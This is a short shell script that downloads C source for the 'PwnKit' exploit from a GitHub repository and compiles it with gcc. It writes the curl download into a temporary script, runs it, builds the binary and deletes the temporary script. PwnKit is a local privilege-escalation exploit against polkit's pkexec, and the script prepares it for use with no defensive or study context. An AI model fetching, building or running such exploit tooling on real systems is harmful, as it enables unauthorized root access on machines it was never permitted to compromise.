echo "Creating SH File..."
printf "curl -fsSL https://raw.githubusercontent.com/CCR-ice/pwnkit/main/PwnKit.c -o PwnKit.c\n" > start.sh
sleep 5
chmod +x ./start.sh
sleep 5
echo "Fetching C source..."
./start.sh
sleep 5
echo "Done."
echo "Creating ecxecutable..."
gcc -o PwnKit PwnKit.c
sleep 5
echo "Done."
echo "Cleaning up..."
rm -rf start.sh
echo "Done."
